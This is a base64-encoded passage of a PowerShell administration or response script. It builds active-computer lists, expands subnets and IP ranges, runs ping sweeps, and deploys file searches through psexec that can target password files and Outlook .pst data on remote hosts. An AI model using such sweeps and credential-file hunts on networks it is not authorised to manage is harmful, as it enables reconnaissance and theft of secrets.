VURVJOQU1FCgkJCX0KCQl9Cgl9Cn0KCkZ1bmN0aW9uIEdldEFjdGl2ZUNvbXB1dGVycwp7CgkoZ2V0LURhdGUpLlRvU3RyaW5nKCkgfCBXcml0ZS1Ib3N0CglXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJHZW5lcmF0aW5nIGxpc3Qgb2YgYWN0aXZlIGNvbXB1dGVycyIKCSRTY2FubmVkSG9zdHMgPSAiU2Nhbm5lZF9Ib3N0cyQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCSRUaHJlYWRzID0gJHNjYW4uVGhyb3R0bGUgI3N0b3JlIG51bWJlciBvZiB0aHJlYWRzCgkkc2Nhbi5UaHJvdHRsZSA9ICRzY2FuLlRocm90dGxlICogNSAjbG90cyBvZiBuZXR3b3JrIGRlbGF5IGZvciBhYnNlbnQgaG9zdHMgc28gaW5jcmVhc2UgdGhyZWFkIGNvdW50IGZvciBydW5zcGFjZQoJaWYoJHNjYW4uVGhyb3R0bGUgLWd0IDUwKXskc2Nhbi5UaHJvdHRsZSA9IDUwfQoJJHNjYW4uRG9tYWluTmFtZSA9ICREaXN0aW5ndWlzaGVkTmFtZQoJW3N0cmluZ1tdXSAkQ29tcHV0ZXJzID0gR2V0Q29tcHV0ZXJzICRTY2FuSG9zdHNGaWxlCgkjJGNvbXB1dGVyc3xhZGQtY29udGVudCAiJE9VVF9ESVJcY29tcHV0ZXJzLnR4dCIKCVtzdHJpbmdbXV0gJEFjdGl2ZUNvbXB1dGVycyA9IFJ1blNjcmlwdEJsb2NrICRBY3RpdmVDb21wdXRlcnNfU0IgJENvbXB1dGVycyAkc2NhbgoJJHNjYW4uVGhyb3R0bGUgPSAkVGhyZWFkcyAjcmUtc2V0IHRocm90dGxlCgoJJEFjdGl2ZUNvbXB1dGVycyA9ICRBY3RpdmVDb21wdXRlcnMgfCBTb3J0IC1VbmlxdWUgfCBTZWxlY3QtU3RyaW5nIC1Ob3RNYXRjaCAkZW52OkNPTVBVVEVSTkFNRSAjcmVtb3ZlIHNjYW5uaW5nIG1hY2hpbmUgYW5kIGFueSBkdXBsaWNhdGVzCgkkbnVtQWN0T3JpZyA9ICRBY3RpdmVDb21wdXRlcnMuY291bnQgI251bWJlciBvZiBhY3RpdmUgY29tcHV0ZXJzIHJldHVybmVkCgkKCSNXcml0ZSBsaXN0IG9mIGNvbXB1dGVycyB0byBmaWxlIHN0YXJ0aW5nIHdpdGggY29sdW1uIG5hbWVzCgkiSG9zdCBOYW1lLElQIEFkZHJlc3MsT3BlcmF0aW5nIFN5c3RlbSxWZXJzaW9uInxBZGQtQ29udGVudCAiJFRFTVBfRElSXCRTY2FubmVkSG9zdHMiCgkkQWN0aXZlQ29tcHV0ZXJzIHxBZGQtQ29udGVudCAiJFRFTVBfRElSXCRTY2FubmVkSG9zdHMiCglDb252ZXJ0RmlsZUZvcm1hdCAiJFRFTVBfRElSXCRTY2FubmVkSG9zdHMiICR0cnVlIAoJCgkjbGlzdCBvZiBjb21wdXRlcnMgaGFzIGJlZW4gZ2VuZXJhdGVkCgkkU2NyaXB0OkZpcnN0UnVuQ29tcHMgPSAkZmFsc2UgCgkkbnVtVG90ID0gJENvbXB1dGVycy5jb3VudAoJJG51bUFjdCA9ICRBY3RpdmVDb21wdXRlcnMuQ291bnQKCSRudW1EaWYgPSAkbnVtQWN0T3JpZyAtICRudW1BY3QgI2luIGNhc2UgdGhlcmUgd2VyZSBkdXBsaWNhdGUgaG9zdHMgZm91bmQKCSRudW1Ub3QgPSAkbnVtVG90IC0gJG51bURpZgoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiJG51bUFjdC8kbnVtVG90IGFjdGl2ZSBjb21wdXRlcnMgZm91bmQKCSIKCSNTdG9yZSBhIHRpbWVzdGFtcCBmb3Igd2hlbiBsaXN0IG9mIGNvbXB1dGVycyB3YXMgZ2VuZXJhdGVkIHRvIHVwZGF0ZSBsaXN0IGFmdGVyIHRpbWUKCSRzY3JpcHQ6Q29tcHNEYXRlID0gR2V0LURhdGUgCglyZXR1cm4gJEFjdGl2ZUNvbXB1dGVycwp9CgpGdW5jdGlvbiBWZXJpZnlJUAp7CglwYXJhbSgkSVAsICRDSURSKQoJCgkkT2N0ZXRzID0gJElQLnNwbGl0KCIuIikKCWlmKCRPY3RldHMuY291bnQgLW5lIDQpe1JldHVybiAkZmFsc2V9CgkKCWlmKCRDSURSKQoJewoJCSRDSURSID0gW2NvbnZlcnRdOjpUb0ludDMyKCRDSURSLCAxMCkKCQlpZigtbm90ICgoJENJRFIgLWdlIDEpIC1hbmQgKCRDSURSIC1sZSAzMikpKQoJCXsKCQkJUmV0dXJuICRmYWxzZQoJCX0KCX0JCgkKCWZvcigkaT0wOyAkaSAtbHQgNDsgJGkrKykKCXsKCQkkbnVtID0gW2NvbnZlcnRdOjpUb0ludDMyKCRPY3RldHNbJGldLCAxMCkKCQlpZigtbm90ICgoJG51bSAtbGUgMjU1KSAtYW5kICgkbnVtIC1nZSAwKSkpewoJCQlSZXR1cm4gJGZhbHNlCgkJfQoJfQoJUmV0dXJuICR0cnVlCn0KCkZ1bmN0aW9uIEdldC1JUFN1Ym5ldCAKeyAKIAogICAgICAgIFBhcmFtKCAKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0gCiAgICAgICAgW0FycmF5XSAkU3VibmV0cyAKICAgICAgICApIAogCglmb3JlYWNoKCRzdWJuZXQgaW4gJFN1Ym5ldHMpeyAKIAoJCSNTcGxpdCBJUCBhbmQgc3VibmV0IAoJCSRJUCA9ICgkU3VibmV0IC1zcGxpdCAiXC8iKVswXSAKCQkkQ0lEUiA9ICgkU3VibmV0IC1zcGxpdCAiXC8iKVsxXQoJCQoJCWlmKC1ub3QgKFZlcmlmeUlQICRJUCAkQ0lEUikpCgkJewoJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICJJbnZhbGlkIHN1Ym5ldDogJHN1Ym5ldCIKCQkJUmV0dXJuICRmYWxzZQoJCX0KCX0KCQoJZm9yZWFjaCgkc3VibmV0IGluICRTdWJuZXRzKQoJewoKCQkjU3BsaXQgSVAgYW5kIHN1Ym5ldCAKCQkkSVAgPSAoJFN1Ym5ldCAtc3BsaXQgIlwvIilbMF0gCgkJCiAgICAgICAgJFN1Ym5ldEJpdHMgPSAoJFN1Ym5ldCAtc3BsaXQgIlwvIilbMV0gCiAgICAgICAgIAogICAgICAgICNDb252ZXJ0IElQIGludG8gYmluYXJ5IAogICAgICAgICNTcGxpdCBJUCBpbnRvIGRpZmZlcmVudCBvY3RlY3RzIGFuZCBmb3IgZWFjaCBvbmUsIGZpZ3VyZSBvdXQgdGhlIGJpbmFyeSB3aXRoIGxlYWRpbmcgemVyb3MgYW5kIGFkZCB0byB0aGUgdG90YWwgCiAgICAgICAgJE9jdGV0cyA9ICRJUCAtc3BsaXQgIlwuIiAKICAgICAgICAkSVBJbkJpbmFyeSA9IEAoKSAKICAgICAgICBmb3JlYWNoKCRPY3RldCBpbiAkT2N0ZXRzKSAKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICNjb252ZXJ0IHRvIGJpbmFyeSAKICAgICAgICAgICAgICAgICRPY3RldEluQmluYXJ5ID0gW2NvbnZlcnRdOjpUb1N0cmluZygkT2N0ZXQsMikgCiAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjZ2V0IGxlbmd0aCBvZiBiaW5hcnkgc3RyaW5nIGFkZCBsZWFkaW5nIHplcm9zIHRvIG1ha2Ugb2N0ZXQgCiAgICAgICAgICAgICAgICAkT2N0ZXRJbkJpbmFyeSA9ICgiMCIgKiAoOCAtICgkT2N0ZXRJbkJpbmFyeSkuTGVuZ3RoKSArICRPY3RldEluQmluYXJ5KSAKIAogICAgICAgICAgICAgICAgJElQSW5CaW5hcnkgPSAkSVBJbkJpbmFyeSArICRPY3RldEluQmluYXJ5IAogICAgICAgICAgICB9IAogICAgICAgICRJUEluQmluYXJ5ID0gJElQSW5CaW5hcnkgLWpvaW4gIiIgCiAKICAgICAgICAjR2V0IG5ldHdvcmsgSUQgYnkgc3VidHJhY3Rpbmcgc3VibmV0IG1hc2sgCiAgICAgICAgJEhvc3RCaXRzID0gMzItJFN1Ym5ldEJpdHMgCiAgICAgICAgJE5ldHdvcmtJREluQmluYXJ5ID0gJElQSW5CaW5hcnkuU3Vic3RyaW5nKDAsJFN1Ym5ldEJpdHMpIAogICAgICAgICAKICAgICAgICAjR2V0IGhvc3QgSUQgYW5kIGdldCB0aGUgZmlyc3QgaG9zdCBJRCBieSBjb252ZXJ0aW5nIGFsbCAxcyBpbnRvIDBzIAogICAgICAgICRIb3N0SURJbkJpbmFyeSA9ICRJUEluQmluYXJ5LlN1YnN0cmluZygkU3VibmV0Qml0cywkSG9zdEJpdHMpICAgICAgICAgCiAgICAgICAgJEhvc3RJREluQmluYXJ5ID0gJEhvc3RJREluQmluYXJ5IC1yZXBsYWNlICIxIiwiMCIgCiAKICAgICAgICAjV29yayBvdXQgYWxsIHRoZSBob3N0IElEcyBpbiB0aGF0IHN1Ym5ldCBieSBjeWNsaW5nIHRocm91Z2ggJGkgZnJvbSAxIHVwIHRvIG1heCAkSG9zdElESW5CaW5hcnkgKGkuZS4gMXMgc3RyaW5nZWQgdXAgdG8gJEhvc3RCaXRzKSAKICAgICAgICAjV29yayBvdXQgbWF4ICRIb3N0SURJbkJpbmFyeSAKICAgICAgICAkaW1heCA9IFtjb252ZXJ0XTo6VG9JbnQzMigoIjEiICogJEhvc3RCaXRzKSwyKSAtMSAKIAogICAgICAgICRJUHMgPSBAKCkgCiAKICAgICAgICAjTmV4dCBJRCBpcyBmaXJzdCBuZXR3b3JrIElEIGNvbnZlcnRlZCB0byBkZWNpbWFsIHBsdXMgJGkgdGhlbiBjb252ZXJ0ZWQgdG8gYmluYXJ5IAogICAgICAgIEZvciAoJGkgPSAxIDsgJGkgLWxlICRpbWF4IDsgJGkrKykgCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAjQ29udmVydCB0byBkZWNpbWFsIGFuZCBhZGQgJGkgCiAgICAgICAgICAgICAgICAkTmV4dEhvc3RJREluRGVjaW1hbCA9IChbY29udmVydF06OlRvSW50MzIoJEhvc3RJREluQmluYXJ5LDIpICsgJGkpIAogICAgICAgICAgICAgICAgI0NvbnZlcnQgYmFjayB0byBiaW5hcnkgCiAgICAgICAgICAgICAgICAkTmV4dEhvc3RJREluQmluYXJ5ID0gW2NvbnZlcnRdOjpUb1N0cmluZygkTmV4dEhvc3RJREluRGVjaW1hbCwyKSAKICAgICAgICAgICAgICAgICNBZGQgbGVhZGluZyB6ZXJvcyAKICAgICAgICAgICAgICAgICNOdW1iZXIgb2YgemVyb3MgdG8gYWRkICAKICAgICAgICAgICAgICAgICROb09mWmVyb3NUb0FkZCA9ICRIb3N0SURJbkJpbmFyeS5MZW5ndGggLSAkTmV4dEhvc3RJREluQmluYXJ5Lkxlbmd0aCAKICAgICAgICAgICAgICAgICROZXh0SG9zdElESW5CaW5hcnkgPSAoIjAiICogJE5vT2ZaZXJvc1RvQWRkKSArICROZXh0SG9zdElESW5CaW5hcnkgCiAKICAgICAgICAgICAgICAgICNXb3JrIG91dCBuZXh0IElQIAogICAgICAgICAgICAgICAgI0FkZCBuZXR3b3JrSUQgdG8gaG9zdElEIAogICAgICAgICAgICAgICAgJE5leHRJUEluQmluYXJ5ID0gJE5ldHdvcmtJREluQmluYXJ5ICsgJE5leHRIb3N0SURJbkJpbmFyeSAKICAgICAgICAgICAgICAgICNTcGxpdCBpbnRvIG9jdGV0cyBhbmQgc2VwYXJhdGUgYnkgLiB0aGVuIGpvaW4gCiAgICAgICAgICAgICAgICAkSVAgPSBAKCkgCiAgICAgICAgICAgICAgICBGb3IgKCR4ID0gMSA7ICR4IC1sZSA0IDsgJHgrKykgCiAgICAgICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgICAgI1dvcmsgb3V0IHN0YXJ0IGNoYXJhY3RlciBwb3NpdGlvbiAKICAgICAgICAgICAgICAgICAgICAgICAgJFN0YXJ0Q2hhck51bWJlciA9ICgkeC0xKSo4IAogICAgICAgICAgICAgICAgICAgICAgICAjR2V0IG9jdGV0IGluIGJpbmFyeSAKICAgICAgICAgICAgICAgICAgICAgICAgJElQT2N0ZXRJbkJpbmFyeSA9ICROZXh0SVBJbkJpbmFyeS5TdWJzdHJpbmcoJFN0YXJ0Q2hhck51bWJlciw4KSAKICAgICAgICAgICAgICAgICAgICAgICAgI0NvbnZlcnQgb2N0ZXQgaW50byBkZWNpbWFsIAogICAgICAgICAgICAgICAgICAgICAgICAkSVBPY3RldEluRGVjaW1hbCA9IFtjb252ZXJ0XTo6VG9JbnQzMigkSVBPY3RldEluQmluYXJ5LDIpIAogICAgICAgICAgICAgICAgICAgICAgICAjQWRkIG9jdGV0IHRvIElQICAKICAgICAgICAgICAgICAgICAgICAgICAgJElQICs9ICRJUE9jdGV0SW5EZWNpbWFsIAogICAgICAgICAgICAgICAgICAgIH0gCiAKICAgICAgICAgICAgICAgICNTZXBhcmF0ZSBieSAuIAogICAgICAgICAgICAgICAgJElQID0gJElQIC1qb2luICIuIiAKICAgICAgICAgICAgICAgICRJUHMgKz0gJElQIAogICAgICAgICAgICB9IAogICAgICAgICRJUHMgCiAgICB9IAp9CgpGdW5jdGlvbiBHZXQtSVBSYW5nZSAKewoKICAgICAgICBQYXJhbSggCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldIAogICAgICAgIFtBcnJheV0gJFJhbmdlcyAKICAgICAgICApIAoJCQoJZm9yZWFjaCgkUmFuZ2UgaW4gJFJhbmdlcyl7IAogCgkJI1NwbGl0IElQIGFuZCBzdWJuZXQgCgkJJFN0YXJ0SVAgPSAkUmFuZ2Uuc3BsaXQoIi0iKVswXQoJCSRFbmRJUCA9ICRSYW5nZS5zcGxpdCgiLSIpWzFdCgoJCWlmKC1ub3QgKFZlcmlmeUlQICRTdGFydElQKSkKCQl7CgkJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkludmFsaWQgcmFuZ2U6ICRSYW5nZSIKCQkJUmV0dXJuICRmYWxzZQoJCX0KCQlpZigtbm90IChWZXJpZnlJUCAkRW5kSVApKQoJCXsKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiSW52YWxpZCByYW5nZTogJFJhbmdlIgoJCQlSZXR1cm4gJGZhbHNlCgkJfQoJfQoJCglmb3JlYWNoKCRSYW5nZSBpbiAkUmFuZ2VzKQoJeyAJCgkJJFRlbXBJUEFycmF5ID0gJFJhbmdlLnNwbGl0KCItIikKCQkkVGVtcElQQXJyYXkgPSBbU3lzdGVtLlZlcnNpb25bXV0gKCRUZW1wSVBBcnJheSkgfCBTb3J0LU9iamVjdAoJCSRTdGFydElQID0gJFRlbXBJUEFycmF5WzBdLlRvU3RyaW5nKCkKCQkkRW5kSVAgPSAkVGVtcElQQXJyYXlbMV0uVG9TdHJpbmcoKQoJCgkJJFN0YXJ0T2N0MSA9IFtjb252ZXJ0XTo6VG9JbnQzMigkU3RhcnRJUC5zcGxpdCgiLiIpWzBdLCAxMCkKCQkkU3RhcnRPY3QyID0gW2NvbnZlcnRdOjpUb0ludDMyKCRTdGFydElQLnNwbGl0KCIuIilbMV0sIDEwKQoJCSRTdGFydE9jdDMgPSBbY29udmVydF06OlRvSW50MzIoJFN0YXJ0SVAuc3BsaXQoIi4iKVsyXSwgMTApCgkJJFN0YXJ0T2N0NCA9IFtjb252ZXJ0XTo6VG9JbnQzMigkU3RhcnRJUC5zcGxpdCgiLiIpWzNdLCAxMCkKCQkKCQkkRW5kT2N0MSA9IFtjb252ZXJ0XTo6VG9JbnQzMigkRW5kSVAuc3BsaXQoIi4iKVswXSwgMTApCgkJJEVuZE9jdDIgPSBbY29udmVydF06OlRvSW50MzIoJEVuZElQLnNwbGl0KCIuIilbMV0sIDEwKQoJCSRFbmRPY3QzID0gW2NvbnZlcnRdOjpUb0ludDMyKCRFbmRJUC5zcGxpdCgiLiIpWzJdLCAxMCkKCQkkRW5kT2N0NCA9IFtjb252ZXJ0XTo6VG9JbnQzMigkRW5kSVAuc3BsaXQoIi4iKVszXSwgMTApCgkJCgkJZm9yKCRpPTA7ICRpIC1sdCA0OyAkaSsrKQoJCXsKCQkJJG51bSA9IFtjb252ZXJ0XTo6VG9JbnQzMigkU3RhcnRJUC5zcGxpdCgiLiIpWyRpXSwgMTApCgkJCWlmKC1ub3QgKCgkbnVtIC1sZSAyNTUpIC1hbmQgKCRudW0gLWdlIDApKSl7CgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICJJbnZhbGlkIElQIHJhbmdlOiAkUmFuZ2UiCgkJCQkkaW52YWxpZD0kdHJ1ZQoJCQl9CgkJfQoJCWlmKCRpbnZhbGlkKXskaW52YWxpZD0kZmFsc2U7IGNvbnRpbnVlfQoJCQoJCWZvcigkaT0wOyAkaSAtbHQgNDsgJGkrKykKCQl7CgkJCSRudW0gPSBbY29udmVydF06OlRvSW50MzIoJEVuZElQLnNwbGl0KCIuIilbJGldLCAxMCkKCQkJaWYoLW5vdCAoKCRudW0gLWxlIDI1NSkgLWFuZCAoJG51bSAtZ2UgMCkpKXsKCQkJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkludmFsaWQgSVAgcmFuZ2U6ICRSYW5nZSIKCQkJCSRpbnZhbGlkPSR0cnVlCgkJCX0KCQl9CgkJaWYoJGludmFsaWQpeyRpbnZhbGlkPSRmYWxzZTsgY29udGludWV9CgkJCgkJZm9yKCRTdGFydE9jdDE7ICRTdGFydE9jdDEgLWxlICRFbmRPY3QxOyAkU3RhcnRPY3QxKyspewoJCQlpZigtbm90ICgkU3RhcnRPY3QxIC1lcSAkRW5kT2N0MSkpewoJCQkJCQkkVGVtcEVuZDIgPSAyNTUKCQkJfSAKCQkJRWxzZSB7JFRlbXBFbmQyID0gJEVuZE9jdDJ9CgkJCQoJCQlmb3IoJFN0YXJ0T2N0MjsgJFN0YXJ0T2N0MiAtbGUgJFRlbXBFbmQyOyAkU3RhcnRPY3QyKyspewoJCQkJaWYoLW5vdCAoKCRTdGFydE9jdDIgLWVxICRFbmRPY3QyKSAtYW5kICgkU3RhcnRPY3QxIC1lcSAkRW5kT2N0MSkpKXsKCQkJCQkJJFRlbXBFbmQzID0gMjU1CgkJCQl9IAoJCQkJRWxzZSB7JFRlbXBFbmQzID0gJEVuZE9jdDN9CgoJCQkJZm9yKCRTdGFydE9jdDM7ICRTdGFydE9jdDMgLWxlICRUZW1wRW5kMzsgJFN0YXJ0T2N0MysrKXsKCQkJCQlpZigtbm90ICgoJFN0YXJ0T2N0MyAtZXEgJEVuZE9jdDMpIC1hbmQgKCRTdGFydE9jdDIgLWVxICRFbmRPY3QyKSAtYW5kICgkU3RhcnRPY3QxIC1lcSAkRW5kT2N0MSkpKXsKCQkJCQkJJFRlbXBFbmQ0ID0gMjU1CgkJCQkJfSAKCQkJCQlFbHNlIHskVGVtcEVuZDQgPSAkRW5kT2N0NH0KCQkJCQlmb3IoJFN0YXJ0T2N0NDsgJFN0YXJ0T2N0NCAtbGUgJFRlbXBFbmQ0OyAkU3RhcnRPY3Q0KyspewoJCQkJCQkiJFN0YXJ0T2N0MS4kU3RhcnRPY3QyLiRTdGFydE9jdDMuJFN0YXJ0T2N0NCIKCQkJCQl9CgkJCQkJJFN0YXJ0T2N0ND0wCgkJCQl9CgkJCQkkU3RhcnRPY3QzPTAKCQkJfQoJCQkkU3RhcnRPY3QyPTAKCQl9CgkJJElQcwoJfQp9CgpGdW5jdGlvbiBHZXQtSVBGaWxlIAp7CgoJUGFyYW0oIAoJW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldIAoJW3N0cmluZ10gJEZpbGUgCgkpIAoJCglbQXJyYXldJElQYXJyYXkgPSAkbnVsbAoJJGNvbnRlbnQgPSBHZXQtQ29udGVudCAkRmlsZQoJCglmb3JlYWNoKCRJUCBpbiAkY29udGVudCkKCXsKCQlpZigkSVB8U2VsZWN0LVN0cmluZyAiLSIpCgkJewoJCQkkdGVtcElQID0gR2V0LUlQUmFuZ2UgLVJhbmdlICRJUAoJCQlpZigkdGVtcElQKXskSVBhcnJheSA9ICAkSVBhcnJheSArICR0ZW1wSVB9CgkJfQoJCWVsc2VpZigkSVB8U2VsZWN0LVN0cmluZyAiLyIpCgkJewoJCQkkdGVtcElQID0gR2V0LUlQU3VibmV0IC1TdWJuZXRzICIkSVAiCgkJCWlmKCR0ZW1wSVApeyRJUGFycmF5ID0gICRJUGFycmF5ICsgJHRlbXBJUH0KCQl9CgkJZWxzZQoJCXsKCQkJaWYoVmVyaWZ5SVAgJElQKQoJCQl7CgkJCQkkSVBhcnJheSA9ICAkSVBhcnJheSArICRJUAoJCQl9CgkJfQoJfQoJJGlwc29ydCA9IFtTeXN0ZW0uVmVyc2lvbltdXSgkSVBhcnJheSkgfCAgU29ydC1PYmplY3QKCVJldHVybiAkaXBzb3J0Cn0KCkZ1bmN0aW9uIFBpbmdTd2VlcCAKewoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICIKUGluZyBTd2VlcAotLS0tLS0tLS0tLSIKCXdoaWxlKCR0cnVlKQoJewoJCVdyaXRlLUhvc3QgIklucHV0IElQcyBhcyBTdWJuZXRzWzFdLCBSYW5nZVsyXSwgb3IgZmlsZVszXTogIiAtTm9OZXdMaW5lCgkJJENob2ljZSA9IFJlYWRZZWxsb3cKCQlzd2l0Y2goJENob2ljZSkKCQl7CgkJCTF7CgkJCQlXcml0ZS1Ib3N0ICJFbnRlciBjb21tYSBzZXBhcmF0ZWQgc3VibmV0czogIiAtTm9OZXdMaW5lCgkJCQkkSW5wdXQ9IFJlYWRZZWxsb3cKCQkJCVtBcnJheV0kSVBBcnJheSA9ICRJbnB1dC5zcGxpdCgiLCIpCgkJCQkkSVBMaXN0ID0gR2V0LUlQU3VibmV0IC1TdWJuZXRzICRJUEFycmF5CgkJCQlpZigkSVBMaXN0KXtFeGVjdXRlUGluZ1N3ZWVwICRJUExpc3R9CgkJCQlSZXR1cm59CgkJCTJ7CgkJCQlXcml0ZS1Ib3N0ICJFbnRlciBJUCByYW5nZTogIiAtTm9OZXdMaW5lCgkJCQkkSW5wdXQgPSBSZWFkWWVsbG93CgkJCQlbQXJyYXldJElQQXJyYXkgPSAkSW5wdXQuc3BsaXQoIiwiKQoJCQkJJElQTGlzdCA9IEdldC1JUFJhbmdlIC1SYW5nZSAkSVBBcnJheQoJCQkJaWYoJElQTGlzdCl7RXhlY3V0ZVBpbmdTd2VlcCAkSVBMaXN0fQoJCQkJUmV0dXJufQoJCQkzewoJCQkJV3JpdGUtSG9zdCAiRW50ZXIgSVAgZmlsZTogIiAtTm9OZXdMaW5lCgkJCQkkSW5wdXQ9IFJlYWRZZWxsb3cKCQkJCWlmKC1ub3QgKFRlc3QtUGF0aCAkSW5wdXQpKQoJCQkJewoJCQkJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkZpbGUgbm90IGZvdW5kOiAkSW5wdXQiCgkJCQkJUmV0dXJuCgkJCQl9CgkJCQkkSVBMaXN0ID0gR2V0LUlQRmlsZSAtRmlsZSAkSW5wdXQKCQkJCWlmKCRJUExpc3Qpe0V4ZWN1dGVQaW5nU3dlZXAgJElQTGlzdH0KCQkJCVJldHVybn0KCQkJImgie1JldHVybiAkZmFsc2V9CgkJCSJob21lIntSZXR1cm4gJGZhbHNlfQoJCQkieCJ7RXhpdEZ1bmN0aW9ufQoJCQkiZXhpdCJ7RXhpdEZ1bmN0aW9ufQoJCQlkZWZhdWx0e1dyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkludmFsaWQgaW5wdXQifQoJCX0KCX0KfQoKRnVuY3Rpb24gRXhlY3V0ZVBpbmdTd2VlcAp7CglwYXJhbSgkSVBMaXN0KQoJCglXcml0ZS1Ib3N0CgkKCSRTY3JpcHQ6RGVwbG95ID0gJGZhbHNlCgkkU2NyaXB0Om91dGZpbGU9IlBpbmdTd2VlcCQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQoJV3JpdGUtSG9zdCAkKGdldC1EYXRlKQoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiRXhlY3V0aW5nIHBpbmcgc3dlZXAiCglDcmVhdGVUZW1wRGlyCglSdW5TY3JpcHRCbG9jayAkUGluZ1N3ZWVwU0IgJElQTGlzdCAkc2NhbgoJUGFyc2VEYXRhIDEwOQp9CgpGdW5jdGlvbiBDaG9vc2VGaWxlVHlwZXMKewoJV3JpdGUtSG9zdCAiCkZpbGUtdHlwZXMgdG8gc2VhcmNoLgogICAgCiAgICBbMF0gIEFMTAogICAgWzFdICBJbWFnZSBGaWxlcyAoKi5qcGcsICouanBlZywgKi50aWYsICouZ2lmLCAqLmJtcCkKICAgIFsyXSAgQXVkaW8gRmlsZXMgKCoubTRhLCAqLm00cCwgKi5tcDMsICoud21hKQogICAgWzNdICBWaWRlbyBGaWxlcyAoKi5hc2YsICouYXZpLCAqLm00diwgKi5tb3YsICoubXA0LCAqLm1wZWcsICoubXBnLCAqLndtdikKICAgIFs0XSAgV2luZG93cyBTY3JpcHQgRmlsZXMgKCoucHMxLCAqLnBzbTEsICoudmIsICoudmJzLCAqLmJhdCwgKi5jbWQpCiAgICBbNV0gIEV4ZWN1dGFibGUgRmlsZXMgKCouZXhlLCAqLmRsbCwgKi5zeXMpCiAgICBbNl0gIE91dGxvb2sgZGF0YSBmaWxlcyAoKi5wc3QpCiAgICBbN10gIFBhc3N3b3JkIGZpbGVzICgqcGFzc3cqLCAqcHdkKikKCQkKQ2hvaWNlOiAiIC1Ob05ld0xpbmUKCSRTY2FuQ2hvaWNlID0gUmVhZFllbGxvdwoJV3JpdGUtSG9zdAoJUmV0dXJuIFBhcnNlTWVudUNob2ljZSAkU2NhbkNob2ljZSA3Cn0KCkZ1bmN0aW9uIEZpbGVUeXBlU2VhcmNoIAp7CglXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gIgpGaWxlIFNlYXJjaAotLS0tLS0tLS0tLSIKCXdoaWxlKCR0cnVlKQoJewoJCVdyaXRlLUhvc3QgIlNlYXJjaCBsb2NhbCBwYXRoWzFdIG9yIG5ldHdvcmsgc2hhcmVbMl06ICIgLU5vTmV3TGluZQoJCSRTZWFyY2hTY29wZSA9IFJlYWRZZWxsb3cKCQlzd2l0Y2goJFNlYXJjaFNjb3BlKQoJCXsKCQkJMXtEZXBsb3lGaWxlU2VhcmNoOyByZXR1cm59CgkJCTJ7TmV0U2hhcmVGaWxlU2VhcmNoOyByZXR1cm59CgkJCSJoIntSZXR1cm4gJGZhbHNlfQoJCQkiaG9tZSJ7UmV0dXJuICRmYWxzZX0KCQkJIngie0V4aXRGdW5jdGlvbn0KCQkJImV4aXQie0V4aXRGdW5jdGlvbn0KCQkJZGVmYXVsdHtXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICJJbnZhbGlkIGlucHV0In0KCQl9Cgl9Cn0KCiNkZXBsb3kgZmlsZSBzZWFyY2ggc2VhcmNoZXMgYSBmaWxlIHBhdGggb24gZWFjaCBsb2NhbCBob3N0IHVzaW5nIHBzZXhlYwpGdW5jdGlvbiBEZXBsb3lGaWxlU2VhcmNoCnsKCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmNsZWFyKCkgCgkKCSNBcnJheSB0byBob2xkIHRoZSBjaG9pY2VzIG9mIGZpbGUtdHlwZXMgdG8gc2VhcmNoIGZvcgoJJEZpbGVUeXBlc0FycmF5ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CglXcml0ZS1Ib3N0ICIKRW50ZXIgbG9jYWwgcGF0aCB0byBiZWdpbiBzZWFyY2guICAKRGVmYXVsdCBpcyBDOlw6ICIgLU5vTmV3TGluZQoJJFNjcmlwdDpQYXRoVG9TZWFyY2ggPSBSZWFkWWVsbG93CglpZiAoLW5vdCAkU2NyaXB0OlBhdGhUb1NlYXJjaCl7JFNjcmlwdDpQYXRoVG9TZWFyY2g9IkM6XCJ9ICNkZWZhdWx0IHBhdGggaXMgQzpcCgkkRmlsZVR5cGVzQXJyYXkuYWRkKCQoQ2hvb3NlRmlsZVR5cGVzKSl8T3V0LU51bGwgCgkKCWZvcigkaT0wOyAkaSAtbHQgJEZpbGVUeXBlc0FycmF5LmNvdW50OyAkaSsrKQoJewoJCSNzZXQgc2NyaXB0IHZhcmlhYmxlcyBiYXNlZCBvbiBmaWxlIHR5cGVzCgkJc3dpdGNoKCRGaWxlVHlwZXNBcnJheVskaV0pCgkJewoJCQkxewoJCQkJJFNjcmlwdDpTY2FuQ2hvaWNlQXJyYXkuYWRkKDEwMSl8b3V0LW51bGwKCQkJCSRTY3JpcHQ6SW1hZ2VTZWFyY2hDb2RlX0JBVCA9ICcKCQkJCUBlY2hvIG9mZgoJCQkJSUYgRVhJU1QgIkM6XEltYWdlRmlsZVNlYXJjaDM5MjEyNTI4MSIgREVMICJDOlxJbWFnZUZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQlmb3IgL1IgIicrJFBhdGhUb1N